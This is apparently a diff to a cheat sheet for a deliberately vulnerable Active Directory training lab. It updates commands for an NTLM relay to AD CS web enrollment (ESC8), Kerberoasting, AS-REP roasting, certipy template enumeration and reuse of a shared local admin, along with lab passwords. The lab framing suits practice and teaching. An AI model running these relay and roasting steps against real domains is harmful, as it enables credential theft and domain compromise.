@@ -20,32 +20,32 @@ Quick reference for exploiting all 12 vulnerabilities in the lab.
 Run these to verify the lab is ready:
 
 ```bash
-# Verify connectivity to all machines
-nxc2 smb 192.168.100.10 192.168.100.20 192.168.100.21 -u walter.white -p '774azeG!'
+# Add domain to /etc/hosts (required for Kerberos)
+echo "192.168.100.10 dc01.breakingbad.local breakingbad.local DC01" | sudo tee -a /etc/hosts
 
-# Check ADCS web enrollment is up (vuln 01)
-curl -sk https://192.168.100.10/certsrv/ | grep -q "Microsoft Active Directory Certificate Services" && echo "ESC8: OK"
+# Verify connectivity to all machines
+nxc2 smb 192.168.100.10 192.168.100.20 192.168.100.21 -u Vagrant -p vagrant
+
+# Check ADCS web enrollment - HTTP (vuln 01 ESC8)
+curl -s http://192.168.100.10/certsrv/ | grep -q "401" && echo "ESC8: OK (HTTP auth required)"
 
 # Check WebClient on srv02 (vuln 03)
-nxc2 smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav
+nxc2 smb 192.168.100.21 -u Vagrant -p vagrant -M webdav
 
 # Check password in description (vuln 07)
-nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users
+nxc2 ldap 192.168.100.10 -u Vagrant -p vagrant -M get-desc-users
 
 # Check Kerberoastable users (vuln 08)
-nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting /dev/null
+nxc2 ldap 192.168.100.10 -u Vagrant -p vagrant --kerberoasting /tmp/kerb.txt && cat /tmp/kerb.txt
 
 # Check ASREProastable users (vuln 09)
-nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast /dev/null
+nxc2 ldap 192.168.100.10 -u Vagrant -p vagrant --asreproast /tmp/asrep.txt && cat /tmp/asrep.txt
 
-# Check vulnerable ADCS templates (vuln 10)
-certipy find -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 -vulnerable -stdout 2>/dev/null | grep -E "Template Name|ESC1"
-
-# Check anonymous LDAP (vuln 11)
-nxc2 ldap 192.168.100.10 -u '' -p '' --users 2>&1 | head -5
+# Check vulnerable ADCS templates (vuln 10 ESC1)
+certipy find -u Vagrant@breakingbad.local -p vagrant -dc-ip 192.168.100.10 -vulnerable -stdout 2>/dev/null | grep -E "ESC1|ESC8"
 
 # Check shared local admin (vuln 12)
-nxc2 smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth
+nxc2 smb 192.168.100.20 192.168.100.21 -u svc_admin -p Zomer123! --local-auth
 ```
 
 ---
@@ -55,11 +55,11 @@ nxc2 smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth
 **Target:** dc01 | **What:** NTLM relay to the ADCS HTTP enrollment endpoint to get a certificate as any user.
 
 ```bash
-# Check if web enrollment is available
-curl -k https://192.168.100.10/certsrv/
+# Check if web enrollment is available (HTTP, not HTTPS!)
+curl http://192.168.100.10/certsrv/
 
-# Relay NTLM auth to the web enrollment endpoint (attacker must coerce auth first)
-ntlmrelayx.py -t http://192.168.100.10/certsrv/certfnsh.asp -smb2support --adcs --template Machine
+# Relay NTLM auth to the HTTP web enrollment endpoint (coerce auth first)
+ntlmrelayx.py -t http://192.168.100.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 
 # Use the obtained certificate to authenticate
 certipy auth -pfx dc01.pfx -dc-ip 192.168.100.10
